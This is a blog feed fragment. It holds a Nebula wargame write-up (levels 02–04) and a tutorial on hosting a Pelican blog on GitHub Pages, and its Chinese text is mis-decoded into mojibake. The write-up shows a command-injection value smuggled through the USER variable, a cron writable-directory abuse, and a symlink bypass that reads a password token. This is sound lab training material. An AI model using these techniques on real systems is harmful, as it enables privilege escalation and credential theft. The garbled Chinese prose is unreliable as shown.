&lt;p&gt;è¿™é‡Œè½¯è¿æ¥éœ€è¦åˆ›å»ºåœ¨&lt;code&gt;/home/level01&lt;/code&gt;æˆ–&lt;code&gt;/tmp&lt;/code&gt;ä¸­ï¼Œå¦åˆ™æ²¡æœ‰wæƒé™ã€‚è‡³æ­¤ï¼Œæ­¤é¢˜æ‹¿ä¸‹ã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level02&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;p&gt;å’Œä¸Šä¸€é¢˜ä¸€æ ·çš„é¢˜å¹²ï¼Œè¿˜æ˜¯æ‰¾åˆ°å¯ä»»æ„æ‰§è¡Œç¨‹åºçš„æ¼æ´ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
  printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);

  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿˜æ˜¯ç¯å¢ƒå˜é‡ï¼Œè¿™æ¬¡æ˜¯$USERï¼Œåè€Œç®€å•äº†ï¼Œç›´æ¥æˆªæ–­åŸæ¥çš„ç¨‹åºå³å¯ã€‚ä¸Šä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;USER=&amp;quot;;/bin/getflag;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Over :D&lt;/p&gt;
&lt;h1&gt;Nebula level03&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.&lt;/p&gt;
&lt;p&gt;There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;p&gt;é¢˜ç›®è¯´æ£€æŸ¥flag03çš„homeç›®å½•ï¼Œæ³¨æ„é‡Œé¢çš„æ–‡ä»¶ï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªcrontabä»»åŠ¡æ¯2åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å‘ç°writeable.dç›®å½•å’Œwriteable.shè„šæœ¬ã€‚è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;for i in /home/flag03/writeable.d/* ; do
    (ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
    rm -f &amp;quot;$i&amp;quot;
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å…¶ä¸­&lt;code&gt;ulmint -t 5&lt;/code&gt;æ§åˆ¶CPUæ—¶é—´ä¸è¶…è¿‡5ç§’ï¼Œ&lt;code&gt;bash -x "$i"&lt;/code&gt;ç”¨äºæ‰§è¡Œ$iæ–‡ä»¶ã€‚æ‰§è¡Œå®Œä¹‹ååˆ é™¤æ–‡ä»¶æœ¬èº«ã€‚å› æ­¤ï¼Œåªéœ€è¦åœ¨writeable.dç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¹¶æ‰§è¡ŒæŒ‡ä»¤å³å¯ã€‚æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;/bin/getflag &amp;gt; result.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç³»ç»Ÿä¼šè§¦å‘è¿™ä¸ª.shè„šæœ¬ï¼Œä¹‹åå»çœ‹result.txtæ–‡ä»¶å³å¯å‘ç°getflagå·²ç»æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶ï¼Œè¿™å„¿å¦‚æœè¦çœ‹å…·ä½“çš„crontabçš„ä»»åŠ¡äº‹ä»¶ï¼Œç”¨nebulaè´¦æˆ·ç™»å½•ï¼Œæ‰§è¡Œ&lt;code&gt;sudo crontab -u flag03 -l&lt;/code&gt;å³å¯ã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level04&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
&lt;p&gt;å¯»æ‰¾æ–¹æ³•ç»•å¼€è¯»å–é™åˆ¶ï¼Œè¯»å–tokenæ–‡ä»¶å†…å®¹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
    printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
    exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
    printf(&amp;quot;You may not access '%s'\n&amp;quot;, argv[1]);
    exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
    err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
    err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
  }

  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;flag04çš„homeç›®å½•ä¸‹æœ‰å±äºlevel04ç»„çš„flag04å¯æ‰§è¡Œæ–‡ä»¶å’Œä¸€ä¸ªtokenæ–‡ä»¶ï¼ˆæ— æƒé™ï¼‰ï¼Œå› æ­¤éœ€è¦è°ƒç”¨flag04æ¥è¯»å–tokenã€‚
é¦–å…ˆåˆ†æç¨‹åºé€»è¾‘ï¼Œç¨‹åºæœ‰ä¸€ä¸ªå‚æ•°ï¼Œä½†å‚æ•°åä¸èƒ½æ˜¯tokenï¼ˆå’Œå‰é¢ä¸€æ ·ï¼Œç”¨è½¯è¿æ¥ï¼‰ã€‚ä¹‹åä¼šè¯»å–è¿™ä¸ªå‚æ•°ä¸ºåå­—çš„æ–‡ä»¶ï¼Œå¹¶æŠŠæ–‡ä»¶å†…å®¹è¾“å‡ºåˆ°å±å¹•ï¼ˆ1æ˜¯STD_OUTï¼‰ã€‚ç”±äºflag04ç›®å½•æ²¡æœ‰wæƒé™ï¼Œå› æ­¤è½¯è¿æ¥è¦åˆ›å»ºåˆ°è‡ªå·±çš„å®¶ç›®å½•ä¸­ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;ln -s /home/flag04/token ~/flag04passwd
/home/flag04/flag04 ~/flag04passwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åè¯»å–homeç›®å½•ä¸‹flag04passwdå†…å®¹ï¼Œä¸ºflag04å¯†ç ï¼Œç”¨flag04è´¦æˆ·å’Œè·å–çš„å¯†ç ç™»é™†ågetflagã€‚&lt;/p&gt;</summary><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>åˆ©ç”¨Pelicanåœ¨Githubä¸Šæ­å»ºåšå®¢</title><link href="http://blog.yyx.name/posts/build-blog-on-github-by-pelican.html" rel="alternate"></link><updated>2014-08-14T16:17:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-08-14:posts/build-blog-on-github-by-pelican.html</id><summary type="html">&lt;h1&gt;å†™åœ¨å‰é¢&lt;/h1&gt;
&lt;p&gt;ä¸€ç›´çŸ¥é“Githubæœ‰PageåŠŸèƒ½ï¼Œä½†æ˜¯ä»æ¥æ²¡æƒ³åˆ°æŠŠå®ƒç”¨æ¥åšBlogã€‚é‚£å¤©çªç„¶å‘ç°é™æ€åšå®¢ç³»ç»ŸJekyllï¼Œè®©æˆ‘è¿™ç§ç”¨æƒ¯Wordpressçš„äººé¡¿æ„Ÿæ¬£å–œï¼Œç®€å•ã€è½»é‡ã€çº¯ç²¹çš„åšå®¢æ‰æ˜¯é‚£ä¸ªçœŸæ­£çš„åšå®¢ã€‚é™æ€åšå®¢æœ‰ç€è‡ªå·±çš„ä¼˜åŠ¿ï¼Œæ¯”å¦‚é€Ÿåº¦å¿«ï¼Œå®‰å…¨æ€§é«˜ï¼ŒåŒæ—¶Githubçš„å…è´¹ç©ºé—´è¶³å¤Ÿå¤§(300M)ï¼Œè¿˜æä¾›CDNï¼Œç”šè‡³å¯ä»¥ç»‘å®šåŸŸåã€‚è¿™æ¯”å…è´¹åŠ¨æ€ä¸»æœºã€è‡ªå·±ä¹°ä¸ªè™šæ‹Ÿç©ºé—´æˆ–VPSæ¶ä¸ªåŠ¨æ€CMSéƒ½è¦æ¥çš„åˆ’ç®—ã€‚æœ€æœ€é‡è¦çš„æ˜¯ï¼ŒGithubæœ¬èº«æ˜¯åˆ†å¸ƒå¼æœºåˆ¶çš„ï¼Œè¿™æ ·ä½ çš„æ–‡ç« å®Œå…¨å°±æ˜¯åœ¨æœ¬åœ°å†™(å¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒæ–­ç½‘äº†)ï¼Œä¹‹åsyncåˆ°æœåŠ¡å™¨å³å¯ï¼Œç›¸å½“äºå¤šé‡å¤‡ä»½+Gitå¼ºå¤§çš„ç‰ˆæœ¬ç®¡ç†ã€‚ä¸è¿‡JekyllåŸºäºRubyï¼Œä¸ªäººå¯¹äºRubyåªæœ‰è€³é—»æ²¡æœ‰å°è¯•ï¼Œå› æ­¤åªèƒ½ä½œç½¢(å½“ç„¶ä¹Ÿæ”¾å¼ƒäº†Octopressä¹‹ç±»åŸºäºJekyllçš„)ï¼Œäºæ­¤åŒæ—¶googleåˆ°äº†åŸºäºPythonçš„é™æ€åšå®¢ç³»ç»ŸPelicanï¼Œå› æ­¤å¼€å§‹æŠ˜è…¾ã€‚ä¸€å‘¨åè‡ªåˆ¶ä¸»é¢˜çš„Blogæ€»ç®—ç«£å·¥ï¼Œå› æ­¤å†³å®šæ’°æ–‡ä»¥æ–¹ä¾¿åäººã€‚&lt;/p&gt;
&lt;p&gt;OKï¼Œåœ¨æ­£å¼å¼€å§‹ä¹‹å‰è¿˜è¦è¯´å‡ ç‚¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è™½ç„¶é™æ€åšå®¢ç³»ç»Ÿæœ‰å¾ˆå¤šä¼˜åŠ¿ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¾ˆå¤šç¼ºé™·ã€‚å½“ç„¶å¤§éƒ¨åˆ†ç¼ºé™·å¯ä»¥ç”¨ä¸€äº›å°hintæ¥å¼¥è¡¥ï¼Œè¿™å¯¹äºä¼˜åŠ¿æ¥è¯´è¿˜æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå½“ç„¶ä½ éœ€è¦æ—¢ç„¶å†³ç„¶çš„å»æŠ˜è…¾ã€‚&lt;/li&gt;
&lt;li&gt;ç½‘ä¸ŠJekyllç³»+Githubå»ºåšå®¢çš„æ–‡ç« å¾ˆå¤šï¼ŒPelicanä¹Ÿä¸ç®—ç‰¹åˆ«å°‘ï¼Œå› æ­¤æœ¬æ–‡åŠ›æ±‚å†™å‡ºä¸€äº›ä¸ä¸€æ ·çš„ã€æœ‰è¥å…»çš„ä¸œè¥¿ã€‚&lt;/li&gt;
&lt;li&gt;Pelicanå‡çº§æ—¶å€™é…ç½®æ–‡ä»¶åšäº†è¾ƒå¤§å˜åŒ–(è™½ç„¶æˆ‘è®¤ä¸ºå¯¹äºæ¥å£æˆ–é…ç½®çš„ä¸ä¸¥è°¨è®¾ç½®ä¸æ”¹åŠ¨æ˜¯ä¸å¯å–çš„)ï¼Œä¸æ’é™¤å…¶ä»–å·¥å…·æˆ–ç¯å¢ƒçš„ç‰ˆæœ¬å‡çº§æ—¶å€™çš„å˜åŒ–ã€‚å¦‚ä¸å¹¸ç¢°åˆ°ï¼Œè¯·è‡ªè¡ŒæŸ¥é˜…ç›¸å…³å·¥å…·æˆ–ç¯å¢ƒçš„æ‰‹å†Œï¼ŒRTFM :Dã€‚ &lt;/li&gt;
&lt;li&gt;æˆæ–‡ä»“ä¿ƒï¼Œæ°´å¹³æœ‰é™ï¼Œæœ›ä¸åèµæ•™ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So, let's start...&lt;/p&gt;
&lt;h1&gt;åŸºç¡€å‡†å¤‡&lt;/h1&gt;
&lt;h2&gt;ç³»ç»Ÿç¯å¢ƒ&lt;/h2&gt;
&lt;p&gt;ç”±äºå¹³æ—¶åŠå…¬ç¯å¢ƒè¿˜æ˜¯ä»¥Win7ä¸ºä¸»ï¼Œå› æ­¤è¿˜æ˜¯å†³å®šå°†ç¯å¢ƒæ­å»ºåœ¨Windowsä¸‹ã€‚Linuxä¸‹æ­å»ºç¯å¢ƒæ¯”Windowsæ›´åŠ ç®€å•ï¼Œç½‘ä¸Šä¹Ÿæœ‰ç›¸å…³æ–‡ç« ï¼Œè¯·è‡ªè¡Œæ£€ç´¢ã€‚&lt;/p&gt;
&lt;h2&gt;å¥—ä»¶é€‰æ‹©&lt;/h2&gt;
&lt;p&gt;å¿…è£…ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python3 (2 or 3ä½ è‡ªå·±çº ç»“å»)&lt;/li&gt;
&lt;li&gt;pipå’Œsetuptool(ä¸ºäº†æ–¹ä¾¿packageçš„å®‰è£…)&lt;/li&gt;
&lt;li&gt;Pelican3&lt;/li&gt;
&lt;li&gt;Markdownï¼ˆä¸ªäººè§‰å¾—Markdownè¯­æ³•ç®€æ´ä¼˜ç¾ï¼ŒPelican3è¿˜æ”¯æŒå…¶ä»–è¯­æ³•ï¼‰&lt;/li&gt;
&lt;li&gt;makeå·¥å…·ï¼ˆGNUçš„makeï¼Œwinä¸‹çš„nmakeä¸è¡Œï¼‰&lt;/li&gt;
&lt;li&gt;Gitå·¥å…·é›†ï¼ˆå½“ç„¶è¿˜è¦å»Githubä¸Šæä¸ªè´¦å·ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯é€‰ï¼ˆä¸»è¦è¿™é‡Œæ¯”è¾ƒæŠ˜è…¾ï¼‰ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bootstrap3 (Twitterå‡ºå“çš„å¿«é€Ÿç½‘ç«™æ­å»ºæ¡†æ¶)&lt;/li&gt;
&lt;li&gt;Disqus (å¯ä»¥é€‰æ‹©å›½å†…çš„ç¤¾ä¼šåŒ–è¯„è®ºç³»ç»Ÿï¼Œæ¯”å¦‚å¤šè¯´)&lt;/li&gt;
&lt;li&gt;Google Analytics (å¯ä»¥é€‰æ‹©å…¶ä»–ç½‘ç«™åˆ†ææœåŠ¡å•†ï¼Œæ¯”å¦‚CNZZ)&lt;/li&gt;
&lt;li&gt;MarkdownPad2 (å¯è§†åŒ–çš„Markdownå†™ä½œè½¯ä»¶ï¼Œè¿˜æœ‰å¾ˆå¤šå¯ä»¥é€‰æ‹©çš„ï¼Œç”šè‡³æ˜¯åœ¨çº¿çš„)&lt;/li&gt;
&lt;li&gt;ä¸€äº›åŸºäºJQueryçš„æ’ä»¶&lt;/li&gt;
&lt;li&gt;ä¸€å †å…¶ä»–ä»€ä¹ˆçš„â€¦â€¦&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;æ­å»ºç¯å¢ƒ&lt;/h1&gt;
&lt;h2&gt;å®‰è£…Python&lt;/h2&gt;
&lt;p&gt;åœ¨&lt;a href="https://www.python.org/downloads/"&gt;https://www.python.org/downloads/&lt;/a&gt;ä¸‹è½½Pythonå¹¶å®‰è£…ï¼Œå°±é‚£ä¹ˆç®€å•ã€‚å®‰è£…å®ŒæˆåæŠŠPythonçš„å®‰è£…è·¯å¾„æ‰”åˆ°ç¯å¢ƒå˜é‡Pathé‡Œã€‚&lt;/p&gt;
&lt;h2&gt;å®‰è£…pipå’Œsetuptool&lt;/h2&gt;
&lt;p&gt;åœ¨&lt;a href="https://pip.pypa.io/en/latest/installing.html"&gt;https://pip.pypa.io/en/latest/installing.html&lt;/a&gt;ä¸‹è½½get-pip.pyã€‚æ‰“å¼€cmdï¼Œè¿›å…¥get-pip.pyæ‰€åœ¨ç›®å½•ï¼Œä¹‹åæ‰§è¡Œ&lt;code&gt;python get-pip.py&lt;/code&gt;ï¼Œpipå’Œsetuptooléƒ½ä¼šå®‰è£…å¥½ã€‚&lt;/p&gt;
&lt;h2&gt;å®‰è£…Pelicanå’ŒMarkdown&lt;/h2&gt;
&lt;p&gt;è£…å¥½äº†pipå°±æ–¹ä¾¿äº†ï¼Œç›´æ¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip install pelican
pip install markdown
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹‹åå°†Pythonç›®å½•ä¸‹çš„scriptç›®å½•è·¯å¾„åŠ å…¥ç¯å¢ƒå˜é‡Pathä¸­ã€‚&lt;/p&gt;
&lt;h2&gt;å®‰è£…Gitå·¥å…·&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½Github for Windows &lt;a href="https://windows.github.com/"&gt;https://windows.github.com/&lt;/a&gt; å¹¶å®‰è£…å³å¯ã€‚
å…³äºGitçš„å‘½ä»¤ï¼Œæ¨èä¸€ä¸ªç®€å•çš„&lt;a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000"&gt;gitæ•™ç¨‹&lt;/a&gt;ã€‚å’Œå›¾å½¢ç•Œé¢ç›¸æ¯”ï¼Œgitçš„shellä¹Ÿéå¸¸å¥½ç”¨ã€‚&lt;/p&gt;
&lt;h2&gt;å…¶ä»–&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;makeåªéœ€è¦ä¸‹è½½ä¸‹æ¥å°±å¯ä»¥äº†&lt;a href="http://www.equation.com/servlet/equation.cmd?fa=make"&gt;http://www.equation.com/servlet/equation.cmd?fa=make&lt;/a&gt;ã€‚&lt;/li&gt;
&lt;li&gt;ç½‘ä¸Šå¯èƒ½ä¼šæ¨èæŠŠPelicanè£…åœ¨è™šæ‹Ÿç¯å¢ƒvirtalenvä¸­ï¼Œè¿™ç‚¹ä½ è‡ªå·±å†³å®šã€‚&lt;/li&gt;
&lt;li&gt;å¯é€‰éƒ¨åˆ†çš„ä¸‹è½½å’Œå®‰è£…åœ¨å†™åˆ°çš„æ—¶å€™å†ç»™å‡ºã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;å‘è¡¨Blogçš„å®Œæ•´æµç¨‹&lt;/h1&gt;
&lt;p&gt;Pelicanåˆ›å»ºBlogçš„æ­¥éª¤å¯ä»¥æ€»ç»“ä¸ºï¼šåˆ›å»ºæ¡†æ¶(åŒ…æ‹¬ç›®å½•ç»“æ„ï¼Œä¸»é¢˜æ¨¡æ¿ï¼Œé…ç½®æ–‡ä»¶)--&amp;gt;(åˆ›å»ºä¸»é¢˜)--&amp;gt;å†™æ–‡ç« --&amp;gt;ç”Ÿæˆhtml--&amp;gt;(ä¸Šä¼ Githubç­‰)ã€‚&lt;/p&gt;
&lt;p&gt;å½“ç¢°åˆ°é—®é¢˜æ—¶å€™è®°å¾—æŸ¥é˜…æ‰‹å†Œï¼Œè¿™éƒ¨åˆ†åœ¨æ‰‹å†Œ&lt;a href="http://docs.getpelican.com/"&gt;http://docs.getpelican.com/&lt;/a&gt;çš„getting startedä¸­ã€‚&lt;/p&gt;
&lt;h2&gt;åˆ›å»ºæ¡†æ¶&lt;/h2&gt;
&lt;p&gt;æ‰€è°“çš„æ¡†æ¶å°±æ˜¯ä¸€ä¸ªé™æ€Blogçš„ç”Ÿæˆéª¨æ¶ï¼ŒPelicanåªéœ€è¦ä¸€å¥å‘½ä»¤å³å¯ï¼ˆå…ˆcdåˆ°è¦ç”Ÿæˆçš„ç›®å½•ä¸­ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pelican-quickstart
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œå‘½ä»¤åæ ¹æ®æç¤ºè®¾ç½®ï¼Œä¼šç”Ÿæˆé»˜è®¤çš„é…ç½®æ–‡ä»¶ã€‚æ­¤æ—¶Pelicanå·²ç»ä¸ºæˆ‘ä»¬æ„å»ºäº†æ¡†æ¶ï¼Œç»“æ„å¦‚ä¸‹:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yourproject/
â”œâ”€â”€ content             #å†™å¥½çš„Markdownæ ¼å¼çš„åšæ–‡
â”‚   â””â”€â”€ (pages)         #Markdownæ ¼å¼çš„é™æ€ç•Œé¢(æ¯”å¦‚Aboutï¼ŒåŒWPçš„Page)
â”œâ”€â”€ output              #é€šè¿‡Pelicanæœ€ç»ˆç”Ÿæˆçš„htmlç•Œé¢
â”œâ”€â”€ develop_server.sh   #PelicanæœåŠ¡å™¨çš„è„šæœ¬
â”œâ”€â”€ fabfile.py          #ç”Ÿæˆå’Œä¸Šä¼ ç­‰è‡ªåŠ¨åŒ–æ“ä½œ
â”œâ”€â”€ Makefile            #makeçš„è‡ªåŠ¨åŒ–è„šæœ¬
â”œâ”€â”€ pelicanconf.py      #ä¸»é…ç½®æ–‡ä»¶(æµ‹è¯•ç¯å¢ƒ)
â””â”€â”€ publishconf.py      #ä¸»é…ç½®æ–‡ä»¶çš„æ‰©å±•ï¼Œç”¨äº(ç”Ÿäº§ç¯å¢ƒ)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å†™æ–‡ç« &lt;/h2&gt;
&lt;p&gt;è¿™é‡Œå…¶å®å’ŒPelicanæ²¡å¤šå¤§å…³ç³»äº†ã€‚è¿™é‡Œä½¿ç”¨&lt;a href="http://wowubuntu.com/markdown/"&gt;Makedownè¯­æ³•&lt;/a&gt;å†™æ–‡ç« ï¼Œå¹¶ä¿å­˜ä¸º.mdæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Title: My super title
Date: 2010-12-03 10:20
Category: Python
Tags: pelican, publishing
Slug: my-super-post
Author: Alexis Metaireau
Summary: Short version for index and feeds

This is the content of my super blog post. #æ­£æ–‡å†…å®¹
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢æ˜¯å®˜æ–¹ç»™å‡ºçš„æ¨¡æ¿ï¼Œå¯ä»¥çœ‹åˆ°æ­£æ–‡å†…å®¹å‰ä¸ºæ–‡ç« çš„metaæ•°æ®ï¼Œä½ å¯ä»¥åˆ¶å®šæ–‡ç« çš„æ ‡é¢˜ã€æ—¥æœŸã€ç±»åˆ«ã€æ ‡ç­¾ã€è·¯å¾„åã€ä½œè€…ã€æ‘˜è¦ç­‰(è¿™äº›ä¿¡æ¯éƒ¨åˆ†ä¼šå‡ºç°åœ¨æœ€ç»ˆç”Ÿæˆhtmlçš„metaæ•°æ®ä¸­ï¼Œå½“ç„¶è¿™å–å†³äºä¸»é¢˜æ–‡ä»¶æ˜¯å¦å¼•ç”¨è¿™äº›æ•°æ®)ã€‚è¿™äº›é‡Œé¢åªæœ‰Titleå’ŒDateæ˜¯å¿…é¡»çš„(é»˜è®¤é…ç½®ä¸‹ï¼ŒDateè¦è‡ªå·±æŒ‡å®šæ˜¯ä¸æ˜¯å¾ˆBTï¼Œæ³•å›½äººçš„æ€ç»´çœŸæ˜¯â€¦â€¦)ã€‚metaå—ä¹‹åå°±ç”¨Makrdownå†™æ–‡ç« å•¦~å½“ç„¶ä½ å¯ä»¥å’Œæˆ‘ä¸Šé¢è¯´çš„ä¸€æ ·æä¸€ä¸ªMarkdownçš„å¯è§†åŒ–ç¼–è¾‘å™¨ï¼Œå†™èµ·æ¥å¾ˆæ„‰å¿«ã€‚Markdownè¯­æ³•å®ç°ä¸äº†çš„ç›´æ¥ç”¨htmlçš„è¯­æ³•å³å¯ã€‚&lt;/p&gt;
&lt;h2&gt;Pelicané‡è¦çš„æ“ä½œå‘½ä»¤&lt;/h2&gt;
&lt;p&gt;ç›®å½•ä¸­çš„makefileéå¸¸é‡è¦ï¼Œé€šè¿‡makeè°ƒç”¨makefileä¸­çš„å‘½ä»¤å³å¯å®Œæˆç›¸å…³æ“ä½œã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make html           #åˆ›å»ºé™æ€ç•Œé¢
make regenerate     #ä¿®æ”¹åè‡ªåŠ¨åˆ›å»ºé™æ€ç•Œé¢
make serve          #åˆ›å»ºæœåŠ¡å™¨
make devserver      #ç›¸å½“äºregenerate+serve
make publish        #ç”Ÿæˆç”¨äºå‘å¸ƒçš„html
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰‹å†Œä¸Šè¿˜æœ‰å…¶ä»–ä¸€äº›å‘½ä»¤ï¼Œè¯·è‡ªè¡Œå‘æ˜ã€‚&lt;/p&gt;
&lt;h2&gt;ç”Ÿæˆä¸é¢„è§ˆ&lt;/h2&gt;
&lt;p&gt;æ–‡ç« å†™å¥½äº†å°±ç”¨ä¸Šé¢çš„&lt;code&gt;make html&lt;/code&gt;ç”Ÿæˆæ–‡ç« ï¼Œä½ éœ€è¦åå¤ä¸åœä¿®æ”¹å’Œç”Ÿæˆçš„è¯å°±ç”¨&lt;code&gt;make regenerate&lt;/code&gt;ï¼Œæ¯æ¬¡ä¿®æ”¹ä¼šè‡ªåŠ¨ç”Ÿæˆæ–°çš„htmlã€‚ä¹‹åç”¨&lt;code&gt;make serve&lt;/code&gt;å¼€å¯æœåŠ¡å™¨ï¼Œé»˜è®¤&lt;code&gt;http://localhost:8000&lt;/code&gt;å¯æµè§ˆä½ çš„Blogã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶æœ€åå‘å¸ƒçš„è¯·ä½¿ç”¨&lt;code&gt;make publish&lt;/code&gt;ï¼Œè¯¥é…ç½®æ›´åŠ é€‚åˆç”¨äºæ­£å¼å‘å¸ƒã€‚&lt;/p&gt;
&lt;h2&gt;Githubç›¸å…³æ“ä½œ&lt;/h2&gt;
&lt;p&gt;ä»¥ä¸Šæ­¥éª¤åé™æ€blogå·²ç»ç”Ÿæˆï¼Œé»˜è®¤åœ¨outputæ–‡ä»¶å¤¹ä¸­ã€‚ä¸‹é¢éœ€è¦æŠŠå®ƒä¸Šä¼ åˆ°githubä¸­ã€‚æ‰€æœ‰å…³äºgithub pageçš„æ“ä½œéƒ½åœ¨&lt;a href="http://pages.github.io"&gt;http://pages.github.io&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å…ˆå»Githubæ³¨å†Œè´¦å·ï¼Œæ¯”å¦‚ç”¨æˆ·åæ˜¯usernameï¼Œç„¶åCreate New Repository, Repositoryçš„åå­—å¿…é¡»ä¸ºusername.github.ioï¼ˆç½‘ä¸Šæµä¼ çš„.comçš„è²Œä¼¼å·²ç»æ— æ•ˆäº†ï¼Œæ‰€ä»¥çœ‹æ‰‹å†Œæ˜¯å¤šä¹ˆçš„é‡è¦ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;åˆ›å»ºå¥½äº†ä¹‹åç›´æ¥ç‚¹ä¸Šé¢çš„ç»¿è‰²çš„set up in desktopå°±ä¼šæ‰“å¼€æ¡Œé¢ç«¯çš„Gitå›¾å½¢åŒ–æ“ä½œç•Œé¢ã€‚ä¹‹åä¼šè®©ä½ åŒæ­¥ä¸€ä¸ªæœ¬åœ°çš„ç›®å½•ï¼Œè¿™æ ·æœ¬åœ°çš„ç›®å½•å°±å’Œè¿œç¨‹çš„å…³è”å¥½äº†ã€‚commitä¹‹åsyncå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å½“ç„¶ä¹Ÿå¯ä»¥ç”¨gitshellï¼Œå‘½ä»¤ä¹Ÿå¾ˆç®€å•ã€‚é¦–å…ˆè¿›å…¥éœ€è¦ä¸Šä¼ çš„ç›®å½•ï¼Œä¹‹åæ‰§è¡Œ(å…·ä½“å‘½ä»¤å«ä¹‰å¯ä»¥çœ‹ç›¸å…³gitæ•™ç¨‹)ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git init
git remote origin https://github.com/username/username.github.io.git
git pull
git add .
git commit -m "update"
git push origin master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¤§æ¦‚ç­‰å‡ åˆ†é’Ÿä¹‹åå³å¯è®¿é—®username.github.ioã€‚è‡³æ­¤ï¼Œä¸€ä¸ªå®Œæ•´çš„Pelican+Githubç”Ÿæˆé™æ€Blogçš„æµç¨‹å·²ç»å®Œæˆã€‚&lt;/p&gt;
&lt;h2&gt;ä¸€äº›é—®é¢˜å’Œå¤„ç†&lt;/h2&gt;
&lt;ul&gt;
